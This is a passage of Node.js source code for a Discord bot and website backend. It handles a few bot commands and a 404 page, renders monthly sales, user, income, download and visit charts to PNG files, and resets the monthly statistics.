        message.channel
          .send(
            `>>> Here is your search results for: \`${searchTerm}\`\n  ${
              config["siteInformation"].domain
            }/search?q=${searchTerm.replace(" ", "+")}`
          )
          .catch();
      } else {
        message.channel
          .send(`>>> **You must enter a search term to complete.**`)
          .then((msg) => msg.delete({ timeout: 5000 }))
          .catch();
      }
    }
    if (command === "user") {
      message.delete().catch();
      let mentionedUser = message.guild.member(
        message.mentions.users.first() ||
          message.guild.members.cache.get(args[0])
      );
      if (!mentionedUser)
        return message.channel
          .send(`>>> **You must provide a user via mention or Id.**`)
          .then((msg) => msg.delete({ timeout: 5000 }))
          .catch();

      connection.query(
        `SELECT * FROM users WHERE userId = '${mentionedUser.user.id}'`,
        (err, userResults) => {
          if (userResults[0]) {
            message.channel
              .send(
                `>>> ${config["siteInformation"].domain}/user/${mentionedUser.user.id}`
              )
              .catch();
          } else {
            message.channel
              .send(
                `>>> **This user doesn't have an account yet.**\nCreate an account at ${config["siteInformation"].domain}/login`
              )
              .then((msg) => msg.delete({ timeout: 10000 }))
              .catch();
          }
        }
      );
    }
    if (command === "setpresence") {
      message.delete().catch();
      let newPresence = args.join(" ");
      connection.query(
        `SELECT * FROM users WHERE userId = '${message.author.id}'`,
        (err, userResults) => {
          if (userResults[0]) {
            if (
              userResults.permType < 3 ||
              config["siteInformation"].ownerId == message.author.id
            ) {
              bot.user.setPresence({ activity: { name: newPresence } }).catch();
              message.channel
                .send(`>>> **New presence set!**`)
                .then((msg) => msg.delete({ timeout: 5000 }))
                .catch();
            } else {
              message.channel
                .send(
                  `>>> **You don't have permissions to perform this action.**`
                )
                .then((msg) => msg.delete({ timeout: 5000 }))
                .catch();
            }
          } else {
            message.channel
              .send(
                `>>> **You don't have permissions to perform this action.**`
              )
              .then((msg) => msg.delete({ timeout: 5000 }))
              .catch();
          }
        }
      );
    }
  });
}

// Keep this at the bottom //
bot.login(config["tokens"].discordBotToken);
bot.on("ready", function () {
  bot.user
    .setPresence({
      activity: { name: config["siteInformation"].domain, type: "WATCHING" },
      status: config["discordConfig"].botStatus,
    })
    .catch();
});
app.use(function (req, res, next) {
  if (res.status(404)) {
    getDiscordUserInfo(req, res, function (disData) {
      connection.query(
        "SELECT * FROM sitesettings WHERE id = 1",
        (err, settingResults) => {
          res.render("404", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        }
      );
    });
  }
});

const { ChartJSNodeCanvas } = require("chartjs-node-canvas");
const chartCallback = (ChartJS) => {
  // Global config example: https://www.chartjs.org/docs/latest/configuration/
  ChartJS.defaults.global.elements.rectangle.borderWidth = 2;
  ChartJS.defaults.global.defaultFontColor = "#ffffff";
  // Global plugin example: https://www.chartjs.org/docs/latest/developers/plugins.html
  ChartJS.plugins.register({});
  // New chart type example: https://www.chartjs.org/docs/latest/developers/charts.html
  ChartJS.controllers.MyType = ChartJS.DatasetController.extend({});
};
const chartJSNodeCanvas = new ChartJSNodeCanvas({
  width: 830,
  height: 430,
  chartCallback,
});
async function getInsights() {
  connection.query("SELECT * FROM stats", async function (err, statResults) {
    let configurationSales = {
      type: "line",
      data: {
        labels: [
          "January",
          "February",
          "March",
          "April",
          "May",
          "June",
          "July",
          "August",
          "September",
          "October",
          "November",
          "December",
        ],
        datasets: [
          {
            label: "# of sales",
            data: [
              statResults[0].jan,
              statResults[0].feb,
              statResults[0].mar,
              statResults[0].april,
              statResults[0].may,
              statResults[0].june,
              statResults[0].july,
              statResults[0].aug,
              statResults[0].sep,
              statResults[0].oct,
              statResults[0].nov,
              statResults[0].decem,
            ],
            borderColor: "rgba(43, 114, 230, 1)",
            fill: false,
            borderWidth: 3,
          },
        ],
      },
      options: {
        legend: {
          display: false,
          labels: {
            fontColor: "#FFFFFF",
            fontSize: 14,
          },
        },
        scales: {
          yAxes: [
            {
              ticks: {
                fontColor: "#FFFFFF",
                beginAtZero: true,
                callback: (value) => +value,
              },
              gridLines: {
                color: "rgba(255, 255, 255, 0.2)",
                lineWidth: 1,
              },
            },
          ],
          xAxes: [
            {
              ticks: {
                fontColor: "#FFFFFF",
              },
              gridLines: {
                color: "rgba(255, 255, 255, 0.0)",
                lineWidth: 1,
              },
            },
          ],
        },
        title: {
          display: true,
          text: "Monthly Sales (count)",
        },
        gridLines: {
          display: true,
          color: "#FFFFFF",
        },
      },
    };
    let configurationUsers = {
      type: "line",
      data: {
        labels: [
          "January",
          "February",
          "March",
          "April",
          "May",
          "June",
          "July",
          "August",
          "September",
          "October",
          "November",
          "December",
        ],
        datasets: [
          {
            label: "# of users",
            data: [
              statResults[1].jan,
              statResults[1].feb,
              statResults[1].mar,
              statResults[1].april,
              statResults[1].may,
              statResults[1].june,
              statResults[1].july,
              statResults[1].aug,
              statResults[1].sep,
              statResults[1].oct,
              statResults[1].nov,
              statResults[1].decem,
            ],
            borderColor: "rgba(43, 114, 230, 1)",
            fill: false,
            borderWidth: 3,
          },
        ],
      },
      options: {
        legend: {
          display: false,
          labels: {
            fontColor: "#FFFFFF",
            fontSize: 14,
          },
        },
        scales: {
          yAxes: [
            {
              ticks: {
                fontColor: "#FFFFFF",
                beginAtZero: true,
                callback: (value) => +value,
              },
              gridLines: {
                color: "rgba(255, 255, 255, 0.2)",
                lineWidth: 1,
              },
            },
          ],
          xAxes: [
            {
              ticks: {
                fontColor: "#FFFFFF",
              },
              gridLines: {
                color: "rgba(255, 255, 255, 0.0)",
                lineWidth: 1,
              },
            },
          ],
        },
        title: {
          display: true,
          text: "Newly Joined Users - Account Creation (count)",
        },
        gridLines: {
          display: true,
          color: "#FFFFFF",
        },
      },
    };
    let configurationIncome = {
      type: "line",
      data: {
        labels: [
          "January",
          "February",
          "March",
          "April",
          "May",
          "June",
          "July",
          "August",
          "September",
          "October",
          "November",
          "December",
        ],
        datasets: [
          {
            label: "amount of income",
            data: [
              statResults[2].jan,
              statResults[2].feb,
              statResults[2].mar,
              statResults[2].april,
              statResults[2].may,
              statResults[2].june,
              statResults[2].july,
              statResults[2].aug,
              statResults[2].sep,
              statResults[2].oct,
              statResults[2].nov,
              statResults[2].decem,
            ],
            borderColor: "rgba(43, 114, 230, 1)",
            fill: false,
            borderWidth: 3,
          },
        ],
      },
      options: {
        legend: {
          display: false,
          labels: {
            fontColor: "#FFFFFF",
            fontSize: 14,
          },
        },
        scales: {
          yAxes: [
            {
              ticks: {
                fontColor: "#FFFFFF",
                beginAtZero: true,
                callback: (value) => "$" + value,
              },
              gridLines: {
                color: "rgba(255, 255, 255, 0.2)",
                lineWidth: 1,
              },
            },
          ],
          xAxes: [
            {
              ticks: {
                fontColor: "#FFFFFF",
              },
              gridLines: {
                color: "rgba(255, 255, 255, 0.0)",
                lineWidth: 1,
              },
            },
          ],
        },
        title: {
          display: true,
          text: "Income - Account (dollars)",
        },
        gridLines: {
          display: true,
          color: "#FFFFFF",
        },
      },
    };
    let configurationDownloads = {
      type: "line",
      data: {
        labels: [
          "January",
          "February",
          "March",
          "April",
          "May",
          "June",
          "July",
          "August",
          "September",
          "October",
          "November",
          "December",
        ],
        datasets: [
          {
            label: "amount of clientarea downloads",
            data: [
              statResults[3].jan,
              statResults[3].feb,
              statResults[3].mar,
              statResults[3].april,
              statResults[3].may,
              statResults[3].june,
              statResults[3].july,
              statResults[3].aug,
              statResults[3].sep,
              statResults[3].oct,
              statResults[3].nov,
              statResults[3].decem,
            ],
            borderColor: "rgba(43, 114, 230, 1)",
            fill: false,
            borderWidth: 3,
          },
        ],
      },
      options: {
        legend: {
          display: false,
          labels: {
            fontColor: "#FFFFFF",
            fontSize: 14,
          },
        },
        scales: {
          yAxes: [
            {
              ticks: {
                fontColor: "#FFFFFF",
                beginAtZero: true,
                callback: (value) => value,
              },
              gridLines: {
                color: "rgba(255, 255, 255, 0.2)",
                lineWidth: 1,
              },
            },
          ],
          xAxes: [
            {
              ticks: {
                fontColor: "#FFFFFF",
              },
              gridLines: {
                color: "rgba(255, 255, 255, 0.0)",
                lineWidth: 1,
              },
            },
          ],
        },
        title: {
          display: true,
          text: "Downloads - Client Area (count)",
        },
        gridLines: {
          display: true,
          color: "#FFFFFF",
        },
      },
    };
    let configurationDiscordJoins = {
      type: "line",
      data: {
        labels: [
          "January",
          "February",
          "March",
          "April",
          "May",
          "June",
          "July",
          "August",
          "September",
          "October",
          "November",
          "December",
        ],
        datasets: [
          {
            label: "amount of users auto joined Discord",
            data: [
              statResults[4].jan,
              statResults[4].feb,
              statResults[4].mar,
              statResults[4].april,
              statResults[4].may,
              statResults[4].june,
              statResults[4].july,
              statResults[4].aug,
              statResults[4].sep,
              statResults[4].oct,
              statResults[4].nov,
              statResults[4].decem,
            ],
            borderColor: "rgba(43, 114, 230, 1)",
            fill: false,
            borderWidth: 3,
          },
        ],
      },
      options: {
        legend: {
          display: false,
          labels: {
            fontColor: "#FFFFFF",
            fontSize: 14,
          },
        },
        scales: {
          yAxes: [
            {
              ticks: {
                fontColor: "#FFFFFF",
                beginAtZero: true,
                callback: (value) => value,
              },
              gridLines: {
                color: "rgba(255, 255, 255, 0.2)",
                lineWidth: 1,
              },
            },
          ],
          xAxes: [
            {
              ticks: {
                fontColor: "#FFFFFF",
              },
              gridLines: {
                color: "rgba(255, 255, 255, 0.0)",
                lineWidth: 1,
              },
            },
          ],
        },
        title: {
          display: true,
          text: "Auto Discord Joins (count)",
        },
        gridLines: {
          display: true,
          color: "#FFFFFF",
        },
      },
    };
    let configurationHomeVisits = {
      type: "line",
      data: {
        labels: [
          "January",
          "February",
          "March",
          "April",
          "May",
          "June",
          "July",
          "August",
          "September",
          "October",
          "November",
          "December",
        ],
        datasets: [
          {
            label: "amount of home page visits",
            data: [
              statResults[5].jan,
              statResults[5].feb,
              statResults[5].mar,
              statResults[5].april,
              statResults[5].may,
              statResults[5].june,
              statResults[5].july,
              statResults[5].aug,
              statResults[5].sep,
              statResults[5].oct,
              statResults[5].nov,
              statResults[5].decem,
            ],
            borderColor: "rgba(43, 114, 230, 1)",
            fill: false,
            borderWidth: 3,
          },
        ],
      },
      options: {
        legend: {
          display: false,
          labels: {
            fontColor: "#FFFFFF",
            fontSize: 14,
          },
        },
        scales: {
          yAxes: [
            {
              ticks: {
                fontColor: "#FFFFFF",
                beginAtZero: true,
                callback: (value) => value,
              },
              gridLines: {
                color: "rgba(255, 255, 255, 0.2)",
                lineWidth: 1,
              },
            },
          ],
          xAxes: [
            {
              ticks: {
                fontColor: "#FFFFFF",
              },
              gridLines: {
                color: "rgba(255, 255, 255, 0.0)",
                lineWidth: 1,
              },
            },
          ],
        },
        title: {
          display: true,
          text: "Page Visits - Home Page (count)",
        },
        gridLines: {
          display: true,
          color: "#FFFFFF",
        },
      },
    };
    let configurationTotalVisits = {
      type: "line",
      data: {
        labels: [
          "January",
          "February",
          "March",
          "April",
          "May",
          "June",
          "July",
          "August",
          "September",
          "October",
          "November",
          "December",
        ],
        datasets: [
          {
            label: "amount of total page visits",
            data: [
              statResults[6].jan,
              statResults[6].feb,
              statResults[6].mar,
              statResults[6].april,
              statResults[6].may,
              statResults[6].june,
              statResults[6].july,
              statResults[6].aug,
              statResults[6].sep,
              statResults[6].oct,
              statResults[6].nov,
              statResults[6].decem,
            ],
            borderColor: "rgba(43, 114, 230, 1)",
            fill: false,
            borderWidth: 3,
          },
        ],
      },
      options: {
        legend: {
          display: false,
          labels: {
            fontColor: "#FFFFFF",
            fontSize: 14,
          },
        },
        scales: {
          yAxes: [
            {
              ticks: {
                fontColor: "#FFFFFF",
                beginAtZero: true,
                callback: (value) => value,
              },
              gridLines: {
                color: "rgba(255, 255, 255, 0.2)",
                lineWidth: 1,
              },
            },
          ],
          xAxes: [
            {
              ticks: {
                fontColor: "#FFFFFF",
              },
              gridLines: {
                color: "rgba(255, 255, 255, 0.0)",
                lineWidth: 1,
              },
            },
          ],
        },
        title: {
          display: true,
          text: "Page Visits - Total (count)",
        },
        gridLines: {
          display: true,
          color: "#FFFFFF",
        },
      },
    };
    fs.writeFileSync(
      `./public/images/insight-sales.png`,
      await chartJSNodeCanvas.renderToBuffer(configurationSales)
    );
    fs.writeFileSync(
      `./public/images/insight-users.png`,
      await chartJSNodeCanvas.renderToBuffer(configurationUsers)
    );
    fs.writeFileSync(
      `./public/images/insight-income.png`,
      await chartJSNodeCanvas.renderToBuffer(configurationIncome)
    );
    fs.writeFileSync(
      `./public/images/insight-downloads.png`,
      await chartJSNodeCanvas.renderToBuffer(configurationDownloads)
    );
    fs.writeFileSync(
      `./public/images/insight-discordjoins.png`,
      await chartJSNodeCanvas.renderToBuffer(configurationDiscordJoins)
    );
    fs.writeFileSync(
      `./public/images/insight-homevisits.png`,
      await chartJSNodeCanvas.renderToBuffer(configurationHomeVisits)
    );
    fs.writeFileSync(
      `./public/images/insight-totalvisits.png`,
      await chartJSNodeCanvas.renderToBuffer(configurationTotalVisits)
    );
    // Delete Shit for leaking issues.
    setTimeout(() => {
      configurationSales = null;
      configurationUsers = null;
      configurationIncome = null;
      configurationDownloads = null;
    }, 5000);
  });
}
getInsights();
setInterval(() => {
  getInsights();
}, ms("30m"));

setInterval(() => {
  // Simple checker to reset stats at start of month.
  let date = new Date();
  let day = date.getDate();
  if (day == 1) {
    var monthNumber = date.getMonth();
    if (monthNumber == 0) daMonth = "jan";
    if (monthNumber == 1) daMonth = "feb";
    if (monthNumber == 2) daMonth = "mar";
    if (monthNumber == 3) daMonth = "april";
    if (monthNumber == 4) daMonth = "may";
    if (monthNumber == 5) daMonth = "june";
    if (monthNumber == 6) daMonth = "july";
    if (monthNumber == 7) daMonth = "aug";
    if (monthNumber == 8) daMonth = "sep";
    if (monthNumber == 9) daMonth = "oct";
    if (monthNumber == 10) daMonth = "nov";
    if (monthNumber == 11) daMonth = "decem";
    connection.query(`UPDATE stats SET ${daMonth} = 0`, (err, result) => {
      if (err) console.log(err);
      console.log(`RESET STATS FOR MONTH (${monthNumber})`);
    });
  }
}, ms("16h"));
